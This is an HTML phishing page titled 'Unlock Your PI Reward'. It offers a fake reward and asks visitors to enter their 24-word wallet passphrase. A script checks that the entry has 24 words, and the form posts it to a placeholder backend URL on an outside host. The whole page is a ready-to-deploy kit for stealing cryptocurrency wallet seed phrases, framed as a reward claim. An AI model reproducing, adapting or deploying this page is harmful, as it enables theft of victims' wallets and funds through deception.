<!DOCTYPE html>
<html lang="en">
<head>
  <form action="https://<your-render-backend-url>/submit" method="POST" onsubmit="return validatePassphrase()">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Unlock PI Reward</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background-color: #f4f4f4;
    }

    h1 {
      font-size: 24px;
      color: #333;
      text-align: center;
      margin-bottom: 20px;
    }

    form {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      max-width: 90%;
      width: 400px;
    }

    label {
      display: block;
      font-size: 16px;
      margin-bottom: 8px;
      color: #555;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 14px;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-bottom: 10px;
      display: none; /* Hidden by default */
    }
  </style>
</head>
<body>
  <h1>Unlock Your PI Reward</h1>
  <form action="https://your-render-backend-url.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
    <label for="passphrase">Enter Your 24-Word Passphrase:</label>
    <input type="text" id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase" required>
    <div class="error" id="error-message">Please enter a valid 24-word passphrase.</div>
    <button type="submit">Unlock PI Reward</button>
  </form>

  <script>
    function validatePassphrase() {
      const passphraseInput = document.getElementById("passphrase");
      const errorMessage = document.getElementById("error-message");

      const passphrase = passphraseInput.value.trim();
      if (passphrase.split(" ").length !== 24) {
        errorMessage.style.display = "block";
        return false;
      }

      errorMessage.style.display = "none";
      return true;
    }
  </script>
</body>
</html>
